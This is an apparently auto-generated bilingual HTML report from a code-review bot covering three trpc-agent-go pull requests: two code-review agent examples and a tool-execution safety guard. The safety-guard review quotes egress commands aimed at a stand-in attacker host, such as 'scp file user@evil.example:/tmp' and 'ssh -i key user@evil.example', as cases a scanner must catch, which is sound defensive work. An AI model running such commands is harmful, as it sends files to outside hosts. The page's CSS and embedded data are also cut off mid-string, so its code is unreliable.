<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MyCR 全量评论报告 2026-07-11</title>
<style>

  --radius-md: 16px;

}

}

}

.metric .label { color: var(--muted); margin-top: 7px; font-size: 13px; }

.bar-fill.maintained { background: var(--accent); }
.bar-fill.skipped { background: var(--info); }
.bar-fill.blocked { background: var(--bad); }
.timeline { display: grid; gap: 10px; }
.timeline-item {

}
.chip.active { background: var(--ink); color: white; border-color: var(--ink); }
.cards { display: grid; gap: 12px; }

.card[data-status="approved"],

}

}
.guide-reason {

}
.card-body {
  display: none;
  border-top: 1px solid #edf0f5;
  padding: 0 18px 18px;
}
.card.open .card-body { display: block; }
.grid {
  display: grid;
  grid-template-columns: repeat(2, minmax(0, 1fr));
  gap: 12px;
  margin-top: 14px;
}
.field {
  border: 1px solid #edf0f5;
  background: #fbfcfe;
  border-radius: var(--radius-sm);

}

}

}
.overview-content {

}

}

}

}

.story-block {

}

}

}
.reading-callout.critical {
  border-left-color: #e11d48;
  background: linear-gradient(180deg, #fff7f8, #fff);
}

  border-left-color: #d97706;

}
.reading-callout.skim {

}

}
.reading-callout span {

.story-text mark,

}
.mark-good {

}
.mark-warn {
  color: #92400e;
  background: #fef3c7;
}
.mark-bad {
  color: #9f1239;
  background: #ffe4e6;
}
.mark-info {
  color: #1d4ed8;
  background: #dbeafe;
}
.fact-list {
  display: grid;
  gap: 10px;
  margin: 0;
  padding: 0;
}
.fact {
  border-top: 1px solid #e7edf4;

}
.fact:first-child {

}

}

}

.card[data-status="commented"] .card-head { border-left-color: var(--accent-2); }
.card[data-status="maintained"] .card-head { border-left-color: var(--accent); }
.card[data-status="skipped"] .card-head { border-left-color: var(--info); }
.card[data-status="blocked"] .card-head { border-left-color: var(--bad); }
.card.priority-critical .card-head {
  background: linear-gradient(180deg, #fff7f8, #fff);
}
.card.priority-focus .card-head {
  background: linear-gradient(180deg, #fffbeb, #fff);
}
.card.priority-follow .card-head {
  background: linear-gradient(180deg, #eff6ff, #fff);
}
.card-title {
  font-size: 16px;
  line-height: 1.42;
}
.meta {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: 8px;
  margin-top: 7px;
}
.badge {
  gap: 7px;
  min-width: 0;
  padding: 6px 11px;
  text-transform: none;
  white-space: nowrap;
}
.card-summary {
  color: #526173;
  margin-top: 9px;
}
.badge::before {
  content: "";
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: currentColor;
}
.card-body {
  background: #fff;
  padding: 0 18px 18px;
}
.grid {
  grid-template-columns: 1fr;
  gap: 10px;
}
.field {
  background: #fbfcfe;
  border-color: #e6ecf3;
  padding: 13px 14px;
}
.field strong {
  color: #536175;
  font-size: 11px;
  letter-spacing: 0;
  text-transform: uppercase;
}
.field-body {
  color: #1f2937;
  line-height: 1.62;
}
.comment {
  background: #fff8ed;
  border-left-color: var(--accent-2);
  color: #1f2937;
}
.comment-head {
  color: #1f2937;
}
.pr-readout {
  grid-template-columns: minmax(0, 1fr);
  gap: 18px;
}
.story-block {
  border-top-color: #e2e8f0;
}
.story-block.hero-block {
  background: linear-gradient(180deg, #fbfffe, #f7fbfa);
  border-color: #d5e7e4;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.72);
}
.story-block h4,
.review-rail h4,
.comments-panel h4 {
  font-size: 13px;
  font-weight: 900;
}
.story-line {
  grid-template-columns: 116px minmax(0, 1fr);
  border-top-color: #e9eef5;
}
.story-label {
  color: #607086;
}
.review-rail {
  border: 1px solid #e3eaf2;
  border-radius: 8px;
  padding: 14px;
  background: #fbfcfe;
}
.review-rail .fact-list {
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
}
.fact {
  border-top-color: #e8eef5;
}
.comments-panel {
  border-top-color: #e2e8f0;
}
.comment-list {
  gap: 12px;
}
.skip-group {
  box-shadow: var(--shadow);
}
.skip-group-head {
  align-items: center;
  background: linear-gradient(180deg, #fff, #fbfcfe);
}
.skip-row {
  grid-template-columns: minmax(0, 1.15fr) minmax(220px, 0.85fr);
}
.blocker-item {
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.75);
}
.empty {
  background: #fff;
  box-shadow: var(--shadow);
}
@media (max-width: 840px) {
  .topbar, .card-head { grid-template-columns: 1fr; display: grid; }
  .card-actions { align-items: flex-start; flex-direction: row; flex-wrap: wrap; }
  .dashboard, .grid, .metrics { grid-template-columns: 1fr; }
  .guide-grid { grid-template-columns: 1fr; }
  .headline-row { align-items: flex-start; flex-direction: column; }
  .pr-readout { grid-template-columns: 1fr; }
  .review-rail { position: static; }
  .story-line { grid-template-columns: 1fr; gap: 4px; }
  .timeline-item { grid-template-columns: 1fr; }
  .controls { position: static; }
  .utilities { width: 100%; margin-left: 0; }
  .utility-button { flex: 1 1 auto; }
  .skip-row { grid-template-columns: 1fr; }
}
</style>
</head>
<body>
<div class="shell">
  <div class="topbar">
    <div>
      <h1 data-i18n="title">MyCR 审核报告</h1>
      <p class="subtitle" id="subtitle"></p>
    </div>
    <div class="toggle" aria-label="Language">
      <button type="button" data-lang-button="zh" class="active">中文</button>
      <button type="button" data-lang-button="en">EN</button>
    </div>
  </div>
  <section class="metrics" id="metrics"></section>
  <section class="dashboard">
    <div class="panel">
      <h2 data-i18n="statusDistribution">状态分布</h2>
      <div class="bars" id="bars"></div>
    </div>
    <div class="panel">
      <h2 data-i18n="timeline">执行时间线</h2>
      <div class="timeline" id="timeline"></div>
    </div>
  </section>
  <section class="panel" id="overviewPanel" style="display: none; margin-top: 16px;">
    <h2 data-i18n="overviewSection">整体摘要</h2>
    <div class="overview-content" id="overviewContent"></div>
  </section>
  <section class="panel reading-guide" id="readingGuidePanel" style="display: none;">
    <div class="guide-head">
      <h2 data-i18n="readingGuide">阅读建议</h2>
      <span data-i18n="readingGuideHint">先看高风险和高影响 PR</span>
    </div>
    <div class="guide-grid" id="readingGuide"></div>
  </section>
  <section class="controls">
    <input class="search" id="search" type="search">
    <div class="chips" id="chips"></div>
    <div class="utilities">
      <button type="button" class="utility-button" id="openAll"></button>
      <button type="button" class="utility-button" id="closeAll"></button>
    </div>
  </section>
  <section class="section-heading">
    <h2 data-i18n="reviewedSection">已处理 PR</h2>
    <div class="hint" data-i18n="reviewedHint">点击卡片查看细节</div>
  </section>
  <main class="cards" id="cards"></main>
  <section class="section-heading" id="skippedHeading">
    <h2 data-i18n="skippedGroups">未审核 PR 分类</h2>
    <div class="hint" data-i18n="skippedHint">按排除原因分组</div>
  </section>
  <section class="skip-groups" id="skipGroups"></section>
  <section class="section-heading" id="followUpHeading">
    <h2 data-i18n="followUpSection">后续关注</h2>
    <div class="hint" data-i18n="followUpHint">接近可处理但仍有阻塞</div>
  </section>
  <section class="cards" id="followUpCards"></section>
  <section class="panel" id="evolutionPanel" style="display: none; margin-top: 18px;">
    <h2 data-i18n="selfEvolutionSection">自进化记录</h2>
    <div class="evolution-list" id="evolutionList"></div>
  </section>
  <div class="footer" id="footer"></div>
</div>
<script>
const reportData = {"approved":[],"blocked":[],"commented":[{"alternative_designs":"可以把示例缩成纯规则引擎 demo，也可以把 Skill 脚本作为唯一入口，或把 sandbox/Permission/report 抽象成小型 reusable package。当前端到端形态更有价值，但需要接受更高的契约和测试要求。","api_surface":"不修改框架公共 API；新增示例命令行参数 `--diff-file`、`--repo-path`、`--file-list`、`--fixture-dir`、`--out-dir`、`--db-path`、`--executor`、`--unsafe-local`、`--dry-run`、`--model`，新增报告文件 `review_report.json`/`review_report.md` 和 SQLite schema。","approach":"PR 新增独立 `examples/code_review_agent` Go module，包含 diff parser、inputsource、permission、redaction、review、rules、sandbox、store、telemetry、report、Skill 文档和脚本。主程序从 diff/file-list/repo/fixture 载入输入，运行规则检测，执行 sandbox command，保存 SQLite 记录并输出 JSON/Markdown 报告。","author":"Violet2314","behavior_impact":"预期 before/after：base 没有 CR Agent；合入后用户可对 diff/repo 运行示例并得到可信报告。当前实现可能漏掉已提交 diff、绕过 Skill、在 clean env 下失败、泄露 sandbox 输出或携带有漏洞依赖。","change_inventory":"新增 diff 解析、输入源、规则引擎、权限策略、沙箱执行器、脱敏、报告、SQLite store、telemetry、fixtures、Skill 文档/脚本和测试。","ci_state":"当前 head 的有效检查全部通过（164 checks）。","cross_module_impact":"依赖 codeexecutor container/e2b/local、tool Permission、SQLite store、OpenTelemetry、gRPC/OTel/Docker 相关依赖和 Go toolchain cache 环境。","design_assessment":"方向正确但尚未达到可合入的安全敏感示例标准。Skill 接入、repo diff 基线、clean sandbox 环境、输出脱敏/限流和依赖安全需要修完后再进入人工 maintainer 选择。","evidence_checked":"检查了 issue 2004、PR 描述、examples/code_review_agent 新模块、README/design、Skill 目录、inputsource、sandbox、permission、report、store、go.mod、测试文件、当前绿色 CI，以及 gRPC-Go 与 OpenTelemetry Go SDK 的公开安全公告。","head_sha":"6b66b72e91dc3cdac8e3eb42a935a58fcf538dfb","implementation_derivation":"用独立示例模块承载原型是合理的，避免影响框架公共 API；但实现必须从 issue 的“Skills + sandbox + database”约束推导到运行路径，而不是只把这些部件放在目录里。评论集中在运行路径和安全边界与设计目标不一致的地方。","inline_comments":[{"body":"This path bypasses the `code-review` Skill entirely, so the example does not actually exercise the Skill plus sandbox integration requested by the issue. Please load the skill and route its scripts/rule metadata through the permission/sandbox flow, or narrow the example's contract.\n\n<details><summary>中文<\/summary>\n这里完全绕过了 `code-review` Skill，因此示例没有真正验证 issue 要求的 Skill + 沙箱集成。请加载该 Skill，并把它的脚本/规则元数据接入 Permission 和 sandbox 流程；否则需要收窄示例的契约描述。\n<\/details>","line":183,"path":"examples/code_review_agent/main.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2177#discussion_r3560700508"},{"body":"Repo mode diffs against `master`, but this repository's default branch is `main`, so committed branch changes can be skipped when `master` is absent. Resolve the base from the default branch or make it configurable, and keep `--root` only for unborn HEAD cases.\n\n<details><summary>中文<\/summary>\n仓库模式按 `master` 取 diff，但本仓库默认分支是 `main`；没有 `master` 时，已提交的分支改动可能被跳过。请从默认分支解析 base 或做成可配置，并只在 unborn HEAD 场景使用 `--root` 兜底。\n<\/details>","line":215,"path":"examples/code_review_agent/internal/inputsource/inputsource.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2177#discussion_r3560700510"},{"body":"With `CleanEnv=true`, empty host `GOPATH`/`GOCACHE` values make Go commands fail before review starts. Default these to workspace-local cache paths when unset so `go vet` and `go test` work in a clean sandbox.\n\n<details><summary>中文<\/summary>\n在 `CleanEnv=true` 下，如果宿主的 `GOPATH`/`GOCACHE` 为空，Go 命令会在审查开始前失败。请在未设置时使用工作区内的缓存路径，保证 `go vet` 和 `go test` 能在干净沙箱中运行。\n<\/details>","line":308,"path":"examples/code_review_agent/internal/sandbox/sandbox.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2177#discussion_r3560700513"},{"body":"This caps stdout/stderr only after the executor has already buffered the full output, and the raw bytes later flow into reports and storage. Enforce the limit before full buffering where possible, and redact the bounded output before persisting or rendering it.\n\n<details><summary>中文<\/summary>\n这里是在 executor 已经完整缓存 stdout/stderr 之后才截断，且原始输出后续会进入报告和数据库。请尽量在完整缓存前限制输出，并在落库或渲染前对截断后的输出做脱敏。\n<\/details>","line":267,"path":"examples/code_review_agent/internal/sandbox/sandbox.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2177#discussion_r3560700516"},{"body":"This new security-sensitive example still resolves known-vulnerable sandbox infrastructure dependencies, including gRPC-Go `v1.67.0` and OpenTelemetry SDK `v1.38.0`, both covered by current advisories. Please bump or override the affected modules to fixed scanner-clean versions before adding this sandboxing example.\n\n<details><summary>中文<\/summary>\n这个新增示例是安全敏感的沙箱场景，但仍解析到存在已知漏洞的基础设施依赖，包括当前安全公告覆盖的 gRPC-Go `v1.67.0` 和 OpenTelemetry SDK `v1.38.0`。请在合入前升级或覆盖到扫描通过的修复版本。\n<\/details>","line":66,"path":"examples/code_review_agent/go.mod","url":"https://github.com/trpc-group/trpc-agent-go/pull/2177#discussion_r3560700522"}],"issue_evidence_gaps":"功能方向不缺证据；剩余缺口是实现没有真正把 Skill 接入运行路径，repo diff、clean env、输出治理和依赖安全边界还没有达到 issue 里的可验证系统要求。","merge_policy":{"mode":"human_required","reason":"非 member 且关联贡献者计划任务；即使修完评论也需要人工 maintainer 明确 LGTM 后再合入。","required_evidence":"维护者在新 head 上明确接受该 PR。"},"module_impact":"直接影响 examples；间接影响贡献者和维护者对 Skill、codeexecutor、Permission、store 能否组成 CR Agent 的理解。","modules":"`examples/code_review_agent/main.go`、`internal/inputsource`、`internal/sandbox`、`internal/permission`、`internal/report`、`internal/store`、`skills/code-review`、`go.mod`。","necessity_assessment":"confirmed as a feature task：issue 是维护者创建的贡献者计划任务，当前 base 没有等价的端到端 code review agent 示例。由于这是竞赛/贡献者计划类 PR，本轮只评论，不做自动 LGTM 或 merge。","number":2177,"outcome":"已提交 5 条 inline comments：Skill 未接入运行路径、repo mode 硬编码 master、clean env Go 缓存为空、sandbox 输出截断/脱敏位置不对、go.mod 依赖存在当前安全公告覆盖的漏洞版本。","problem":"该 PR 面向 https://github.com/trpc-group/trpc-agent-go/issues/2004，希望新增一个可验证的自动代码评审 Agent 示例。目标是读取 diff、运行规则和静态检查、记录治理与沙箱结果、落库并输出结构化报告，用来展示 tRPC-Agent-Go 在真实工程 CR 场景中的组合能力。","problem_framing":"表层问题是“新增一个 CR Agent 示例”，深层问题是示例必须能证明多个治理层按真实生产路径协作。如果 Skill 只是文件资产、沙箱只是硬编码命令、报告只写文件不入库，这个示例会变成演示代码而不是可验证集成。","reproduction_on_base":"base 分支缺少该示例能力，因此功能缺口成立；具体实现问题通过阅读当前 PR head 的代码路径和构造 Git main/master、clean env、report persistence、sandbox output 等边界条件确认。","review_action":"只提交 COMMENT review：https://github.com/trpc-group/trpc-agent-go/pull/2177#pullrequestreview-4673495381；没有 LGTM、approval 或 merge。","risk":"如果直接合入，示例会在贡献者计划场景中传达错误安全边界：看似有 Skill、沙箱和审计，实际运行路径和依赖安全仍可能漏检或泄漏。","root_cause":"当前实现把规则引擎、Skill 包和沙箱脚本拆成了并列资产，运行路径直接调用内置规则和硬编码命令；同时 repo diff 和 sandbox 环境默认值按局部假设实现，导致在 main 分支仓库、干净环境和安全扫描场景下出现错漏。","semantic_changes":"从用户视角新增一个可运行示例；从安全语义看，它宣称默认 container/e2b、local 需显式 unsafe、clean env、输出有界、敏感信息脱敏、结果可查询。评论指出这些语义仍有未闭环处。","solution_fit_assessment":"示例模块是合适的交付形态，但当前控制面还不够对齐：Skill 未实际驱动规则/脚本，repo base 不可配置，clean env 没有工作区缓存默认值，sandbox output 治理滞后，安全敏感依赖未升级。","status":"commented","technical_background":"这个示例工程试图把代码评审输入解析、规则检测、Skill 包、Permission 决策、隔离沙箱、SQLite 持久化、报告输出和 telemetry 串成一个端到端示例。Skill 是可复用工作流包，沙箱负责把不可信代码检查放到隔离环境里执行，Permission 负责在执行前做准入判断；这些层只有真正串起来，示例才证明框架能力能协同工作。","tests_docs":"CI 当前绿色，PR 添加大量单元测试和文档；评论要求补 main 分支 repo diff、Skill 执行路径、clean env Go cache、sandbox output redaction、依赖扫描和报告持久化相关测试。","title":"Feat/code review agent","tradeoffs":"端到端示例更能说明框架能力，但复杂度高，任何一层假执行都会降低可信度。更小 demo 更容易合入，却不能覆盖 issue 要求的治理、持久化和沙箱协作。","url":"https://github.com/trpc-group/trpc-agent-go/pull/2177"},{"alternative_designs":"可以禁止所有 SSH-like 命令、只允许 URL 形式网络调用，或使用成熟 shell/argv parser。当前保留命令并解析目标更灵活，但测试矩阵要覆盖常见 option。","api_surface":"新增 safety policy/report/scanner/PermissionPolicy API、策略字段、执行工具安全选项、文档和示例。","approach":"PR 新增 `tool/safety` 包、策略加载、scanner、redaction、audit/telemetry、PermissionPolicy 适配和执行工具集成，并补充英文/中文文档与样例。","author":"xyxhhhhh","behavior_impact":"预期 before/after：`ssh user@evil.example`、`scp file user@evil.example:/tmp` 等非白名单网络目标应被发现。当前带 `-i`/`-p` 等选项时仍可能漏掉目标 host。","change_inventory":"新增规则 ID、策略默认值、JSON/YAML 解析、命令和 raw args 扫描、敏感信息脱敏、audit 输出、OTel 属性和执行工具接入。","ci_state":"当前 head 的有效检查全部通过（164 checks）。","cross_module_impact":"scanner 的 Report 会进入 Permission、执行工具错误、audit JSONL、docs 示例和 telemetry 属性。","design_assessment":"前次问题已明显改进；剩余问题集中在 network host extraction，修复范围较小但对安全语义重要。","evidence_checked":"检查了 issue 2002、当前 PR head、tool/safety scanner/policy/redact/tests、hostexec/workspaceexec/codeexec 集成、文档和样例。复核了前次三条评论对应代码，并检查了新增 schemeless network host 解析。","head_sha":"e90d003f19256064014fffdbf847f30afe88444f","implementation_derivation":"集中 scanner 是合理选择，因为 hostexec/workspaceexec/codeexec 和未来 wrapper 都需要同一套安全判断；但集中化也要求解析器覆盖命令族参数语义。","inline_comments":[{"body":"The SSH/SCP/SFTP host scan stops after the first non-flag argument even when that argument is just an option value, so commands like `ssh -i key user@evil.example` or `ssh -p 2222 evil.example` never check the remote host against `allowed_domains`. Please keep scanning until a real remote target is found, or parse and skip SSH/SCP/SFTP options and their operands, and add regression coverage for option-bearing invocations.\n\n<details><summary>中文<\/summary>\nSSH/SCP/SFTP 的主机扫描在第一个非 flag 参数后就停止，即使该参数只是选项值，因此 `ssh -i key user@evil.example`、`ssh -p 2222 evil.example` 不会把远端主机拿去校验 `allowed_domains`。请继续扫描直到找到真正的远端目标，或解析并跳过 SSH/SCP/SFTP 选项及其参数，并补充带选项调用的回归测试。\n<\/details>","line":1029,"path":"tool/safety/scanner.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2174#discussion_r3560700820"}],"issue_evidence_gaps":"功能需求成立；剩余实现缺口是 SSH/SCP/SFTP 参数解析仍会让 option-bearing 调用绕过 `allowed_domains` 远端主机校验。","merge_policy":{"mode":"human_required","reason":"非 member 且关联贡献者计划任务；本轮只评论，不做自动 LGTM 或 merge。","required_evidence":"作者修复后需要人工 maintainer 明确确认。"},"module_impact":"直接影响工具执行前置检查；间接影响所有接入 guard 的 wrapper、MCP-style tool 和审计消费者。","modules":"`tool/safety/scanner.go`、`tool/safety/*_test.go`、执行工具安全 hook、docs、examples/tool_safety_guard。","necessity_assessment":"confirmed as a feature task：base 分支缺少统一 Tool Execution Safety Guard，issue 仍开放。前次关于 args/argv、sleep 单位、敏感路径脱敏的评论在当前 head 已修复。","number":2174,"outcome":"已提交 1 条 inline comment，指出 SSH/SCP/SFTP 带选项时远端 host 扫描提前停止。","problem":"该 PR 面向 https://github.com/trpc-group/trpc-agent-go/issues/2002，新增工具执行前安全扫描、Permission 拦截、审计和监控机制，覆盖危险删除、敏感路径、网络外连、shell 绕过、hostexec 风险、依赖安装、资源滥用和秘密泄漏。","problem_framing":"安全扫描的核心不是关键词匹配，而是把每类命令的参数语义恢复到策略能理解的结构。网络命令尤其需要识别真正的远端主机，而不是简单扫描第一个非 flag token。","reproduction_on_base":"base 没有该 scanner；本轮通过静态阅读当前 PR head 的 `schemelessNetworkHosts` 逻辑确认 `ssh -i key user@evil.example` 这类命令会在 option operand 处 break。","review_action":"只提交 COMMENT review：https://github.com/trpc-group/trpc-agent-go/pull/2174#pullrequestreview-4673495778；没有 LGTM、approval 或 merge。","risk":"如果允许 SSH/SCP/SFTP 但依赖 allowed_domains，带 option 的命令可能绕过网络外连策略。","root_cause":"`schemelessNetworkHosts` 把所有 SSH-like 命令按同一种“遇到第一个非 flag 参数就停止”规则处理，没有跳过 `-i`、`-p` 等带 operand 的选项。","semantic_changes":"开启 guard 后，命令会在执行前被 allow/deny/ask；网络外连必须命中 allowlist，否则被阻断或要求 review。","solution_fit_assessment":"控制面整体合适，当前需要补齐 SSH-like option parsing，保证 network egress 策略对允许命令也有效。","status":"commented","technical_background":"Tool safety guard 位于模型发起工具执行和真实命令执行之间，负责把 shell string、argv、JSON raw args、code block、stdin 和环境变量归一化，再用策略判断 allow、deny 或 ask。SSH/SCP/SFTP 这类命令的远端目标不一定是第一个非 flag 参数，因为 `-i`、`-p` 等选项本身带参数。","tests_docs":"CI 当前绿色，已有大量 scanner 测试；评论要求补 `ssh -i`、`ssh -p`、`scp -i` 带选项回归。","title":"tool/safety: add tool execution safety guard","tradeoffs":"允许 SSH/SCP/SFTP 提高实用性，但 parser 复杂度更高；简单 deny 全部更安全但不够可用。","url":"https://github.com/trpc-group/trpc-agent-go/pull/2174"},{"alternative_designs":"可以先缩小为 dry-run 规则检测示例，也可以复用 #2177 的 codeexecutor-based sandbox 方向，或先实现 storage/report contract 再接入真实 sandbox。","api_surface":"新增示例命令行参数、SQLite schema/API、报告文件名、sandbox config、redaction helpers；不修改框架公共 API。","approach":"PR 新增独立示例模块，主程序生成 diff、初始化 SQLite、创建 sandbox、运行 go vet/go test、规则检测、写 findings/telemetry，再生成 `review_report.md` 和 `review_report.json`。","author":"xiaoyulox","behavior_impact":"预期 before/after：运行后应得到准确定位、完整脱敏、可查询、经过沙箱检查的报告。当前实现不满足这些保证。","change_inventory":"新增自动评审示例工程、fixtures、规则检测、PermissionPolicy、LocalSandbox、存储、telemetry、报告生成和测试。","ci_state":"当前 head 的有效检查全部通过（164 checks）。","cross_module_impact":"涉及 git diff、Go toolchain、sandbox runtime、SQLite、telemetry 和报告消费者。","design_assessment":"PR 已修复部分前次问题，但仍不能作为完整 CR Agent 示例合入，尤其是沙箱执行和审计输出两条主链路没有闭环。","evidence_checked":"检查了 PR 描述、examples/code_review_agent/main.go、parser、sandbox、redaction、output/report、storage API、前次 MyCR 评论、当前绿色 CI 和最新 head diff。","head_sha":"b7f93482f4058d75dfd2ce71499e22e84988b182","implementation_derivation":"以示例模块实现可以接受，但安全和审计语义必须从 issue 要求推导出来：默认要么接入隔离 runtime，要么失败；报告要能从数据库查询；行号和脱敏要稳定。","inline_comments":[{"body":"`NewSandboxWithConfig` now fails closed unless unsafe local mode is enabled, but this path only logs the error and continues. A default or `--dry-run` execution can therefore skip `go vet`/`go test` sandbox checks entirely while still producing a completed report; please fail the run or wire a real container/E2B backend before reporting success.\n\n<details><summary>中文<\/summary>\n`NewSandboxWithConfig` 现在没有开启 unsafe local 就会 fail closed，但这里只是记录日志后继续执行。因此默认或 `--dry-run` 运行可能完全跳过 `go vet`/`go test` 沙箱检查，却仍输出完成报告。请在没有安全 runtime 时让本次运行失败，或先接入真实 container/E2B 后端再报告成功。\n<\/details>","line":267,"path":"examples/code_review_agent/main.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2151#discussion_r3560700981"},{"body":"The hunk offsets start at `-1`, so added and removed line numbers are reported one line early. Initialize the offsets from zero and update the parser/rule-detector tests to assert real unified-diff line numbers, otherwise findings and reports point to the wrong changed line.\n\n<details><summary>中文<\/summary>\nhunk 偏移从 `-1` 开始，导致新增和删除行号都会提前一行。请从 0 初始化偏移，并更新 parser/rule-detector 测试来校验真实 unified diff 行号，否则 findings 和报告会指向错误的变更行。\n<\/details>","line":138,"path":"examples/code_review_agent/parser/diff_parser.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2151#discussion_r3560700987"},{"body":"The flow writes `review_report.md` and `review_report.json`, but it never persists the final report through `db.CreateReport`. The issue requires querying each task's final report from storage, so please persist the generated report records and add an end-to-end retrieval test.\n\n<details><summary>中文<\/summary>\n当前流程会写出 `review_report.md` 和 `review_report.json`，但没有通过 `db.CreateReport` 把最终报告入库。issue 要求数据库能查询每次任务的最终报告；请把生成的报告记录写入数据库，并补一个按 task 读取报告的端到端测试。\n<\/details>","line":396,"path":"examples/code_review_agent/main.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2151#discussion_r3560700991"},{"body":"This uses the last regexp submatch as the secret value. For JWTs it can leave the header/payload visible, and for an unmatched optional group it can slice with `-1` indexes; redact the full token match or a named value group, with tests for two-segment and three-segment JWTs.\n\n<details><summary>中文<\/summary>\n这里使用最后一个正则子匹配作为 secret value。对 JWT 来说可能留下 header/payload 明文；可选分组未匹配时还可能用 `-1` 下标切片。请改为遮蔽完整 token 或明确的 value 分组，并补两段和三段 JWT 的测试。\n<\/details>","line":40,"path":"examples/code_review_agent/redaction/redaction.go","url":"https://github.com/trpc-group/trpc-agent-go/pull/2151#discussion_r3560701001"}],"issue_evidence_gaps":"功能方向需要维护者人工选择；实现层面缺少默认安全 runtime、正确行号、报告入库和 JWT 完整脱敏的验证。","merge_policy":{"mode":"human_required","reason":"外部贡献者实现且与贡献者计划方向重合，需要人工 maintainer 选择接受方案；本轮只评论。","required_evidence":"作者修复 blocker 后由 maintainer 在新 head 上明确 LGTM。"},"module_impact":"影响 examples 和贡献者计划评审；间接影响维护者对自动 CR Agent 方案是否可复用的判断。","modules":"`examples/code_review_agent/main.go`、`parser/diff_parser.go`、`sandbox/sandbox.go`、`redaction/redaction.go`、`output/report.go`、`storage/storage.go`。","necessity_assessment":"plausible as a contributor-program implementation：方向与 issue 2004 相同，但当前 PR 未直接链接 issue，且仍有多处实现 blocker；本轮只评论。","number":2151,"outcome":"已提交 4 条 inline comments：sandbox 初始化失败继续、diff 行号偏移、报告未入库、JWT 脱敏子匹配问题。","problem":"PR 试图实现一套自动代码评审 Agent 能力：读取 diff 或本地仓库，运行规则/静态检查，记录沙箱执行、权限决策、发现项和 telemetry，并输出 JSON/Markdown 报告。","problem_framing":"根问题是示例输出必须可信。如果沙箱没跑仍报告完成、行号错一行、报告没有落库、token 脱敏不完整，评审 Agent 会给维护者制造错误确定性。","reproduction_on_base":"base 没有该示例；实现问题通过当前 head 代码确认：默认 sandbox 初始化失败只 warning，diff hunk offset 从 -1 起，CreateRep let lang = "zh";
let filter = "all";
const statusOrder = ["approved", "commented", "maintained", "merged", "skipped", "blocked"];

function text(value, fallback = "") {
  if (value === undefined || value === null || value === "") return fallback;
  if (typeof value === "object" && !Array.isArray(value)) {
    return value[lang] || value.zh || value.en || value.summary || value.body || value.mode || fallback;
  }
  return String(value);
}

function escapeHtml(value) {
  return text(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function formatRich(value) {
  let html = escapeHtml(value);
  const replacements = [
    [
      /(P[0-2]|codecov\/patch=FAILURE|go-apidiff=FAILURE|go-apidiff|FAILURE|失败|阻塞|不能合入|不能 merge|未合并|破坏性|breaking|unbounded|无界|绕过|丢失|重复|不稳定|风险)/gi,
      "mark-bad"
    ],
    [
      /(LGTM|已合并|已批准|squash merge|merged|approved|CI 全绿|全绿|修复有效|\bresolved\b|\bresolve\b)/gi,
      "mark-good"
    ],
    [
      /(pending|soft[- ]?CI|软门禁|follow-up|后续|关注|CodeRabbit|review readiness|not_reached)/gi,
      "mark-info"
    ],
    [
      /(导出 API|\bAPI\b|兼容性|\bsession\b|\brunner\b|\bmemory\b|GraphRAG|workspace_exec|OpenAPI|\bpolicy\b|security|安全)/gi,
      "mark-warn"
    ]
  ];
  for (const [pattern, className] of replacements) {
    html = html.replace(pattern, `<mark class="${className}">$1</mark>`);
  }
  return html;
}

function prs() {
  const skippedByNumber = new Map();
  for (const group of skippedGroups()) {
    for (const item of (group.items || [])) {
      const key = item.number ? String(item.number) : `${group.reason || "skipped"}:${text(item.title)}`;
      if (skippedByNumber.has(key)) continue;
      skippedByNumber.set(key, {
      ...item,
      status: item.status || "skipped",
      skip_reason: item.skip_reason || group.reason
      });
    }
  }
  const skipped = [...skippedByNumber.values()];
  return [
    ...(reportData.approved || []),
    ...(reportData.commented || []),
    ...(reportData.maintained || []),
    ...(reportData.blocked || []),
    ...skipped
  ];
}

function skippedGroups() {
  const processedNumbers = new Set([
    ...(reportData.approved || []),
    ...(reportData.commented || []),
    ...(reportData.maintained || []),
    ...(reportData.blocked || [])
  ].map(item => Number(item.number)).filter(Boolean));
  return (reportData.skipped_groups || []).map(group => {
    const existingItems = group.items || [];
    if (existingItems.length) {
      return {
        ...group,
        items: existingItems.filter(item => !processedNumbers.has(Number(item.number)))
      };
    }
    const items = (group.prs || []).filter(number => !processedNumbers.has(Number(number))).map(number => {
      const reason = group.reason || "skipped";
      const summary = text(group.title_zh || group.title || reason);
      return {
        number,
        title: `PR #${number}`,
        url: "",
        author: "",
        status: "skipped",
        skip_reason: summary,
        readiness_audit: summary,
        ci_state: "",
        blockers: [{
          kind: reason,
          summary
        }]
      };
    });
    return { ...group, items, count: items.length };
  }).filter(group => group.items.length > 0);
}

function counts(items) {
  const result = Object.fromEntries(statusOrder.map(status => [status, 0]));
  for (const item of items) {
    const status = item.status || "skipped";
    result[status] = (result[status] || 0) + 1;
  }
  return result;
}

function matchesSearch(item, query) {
  if (!query) return true;
  const haystack = [
    item.number,
    text(item.title),
    item.author,
    text(item.problem),
    text(item.necessity_assessment),
    text(item.evidence_checked),
    text(item.reproduction_on_base),
    text(item.issue_evidence_gaps),
    text(item.approach),
    text(item.implementation_derivation),
    text(item.solution_fit_assessment),
    text(item.outcome),
    text(item.merge_policy),
    text(item.skip_reason),
    text(item.group_reason),
    text(item.readiness_audit),
    blockersSearchText(item.blockers),
    text(item.risk),
    text(item.ci_state)
  ].join(" ").toLowerCase();
  return haystack.includes(query.toLowerCase());
}

function blockersSearchText(blockers) {
  if (!Array.isArray(blockers)) return "";
  return blockers.map(blocker => {
    if (typeof blocker !== "object" || blocker === null) return text(blocker);
    return [
      blocker.kind,
      blocker.summary,
      blocker.reviewer,
      blocker.path,
      blocker.line,
      blocker.latest_response,
      blocker.verification,
      blocker.url
    ].map(value => text(value)).join(" ");
  }).join(" ");
}

function field(label, value) {
